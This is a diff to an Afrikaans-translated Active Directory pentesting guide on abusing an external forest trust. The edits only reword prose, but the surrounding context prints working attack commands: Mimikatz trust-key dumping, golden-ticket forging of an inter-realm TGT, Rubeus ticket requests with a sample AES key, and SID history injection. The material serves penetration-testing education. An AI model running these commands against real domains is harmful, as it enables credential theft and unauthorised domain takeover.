@@ -60,7 +60,7 @@ In die vorige opsomming is gevind dat die gebruiker **`crossuser`** binne die **
 
 ## Begin Toegang
 
-As jy **nie** enige **spesiale** toegang van jou gebruiker in die ander domein kon vind nie, kan jy steeds teruggaan na die AD Metodologie en probeer om **privesc van 'n nie-bevoorregte gebruiker** te doen (goed soos kerberoasting byvoorbeeld):
+As jy **nie** enige **spesiale** toegang van jou gebruiker in die ander domein kon vind nie, kan jy steeds teruggaan na die AD Metodologie en probeer om te **privesc vanaf 'n nie-bevoorregte gebruiker** (goed soos kerberoasting byvoorbeeld):
 
 Jy kan **Powerview funksies** gebruik om die **ander domein** te **opsom** met die `-Domain` param soos in:
 ```powershell
@@ -82,7 +82,7 @@ Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\admini
 
 Jy kan ook [**SID Geskiedenis**](sid-history-injection.md) oor 'n woud vertroue misbruik.
 
-As 'n gebruiker **van een woud na 'n ander** gemigreer word en **SID Filtrering nie geaktiveer is nie**, word dit moontlik om 'n **SID van die ander woud** toe te voeg, en hierdie **SID** sal by die **gebruiker se token** gevoeg word wanneer hulle **oor die vertroue** autentiseer.
+As 'n gebruiker **van een woud na 'n ander** gemigreer word en **SID Filtrering nie geaktiveer is nie**, word dit moontlik om **'n SID van die ander woud** by te voeg, en hierdie **SID** sal **bygevoeg** word tot die **gebruiker se token** wanneer hulle **oor die vertroue** autentiseer.
 
 > [!WARNING]
 > Ter herinnering, jy kan die ondertekeningssleutel kry met
@@ -91,7 +91,7 @@ As 'n gebruiker **van een woud na 'n ander** gemigreer word en **SID Filtrering 
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Jy kan **onderteken met** die **vertroude** sleutel 'n **TGT wat die** gebruiker van die huidige domein naboots.
+Jy kan **onderteken met** die **vertroude** sleutel 'n **TGT wat die gebruiker van die huidige domein naboots**.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -102,7 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Volledige manier om die gebruiker na te volg
+### Volledige manier om die gebruiker na te doen
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
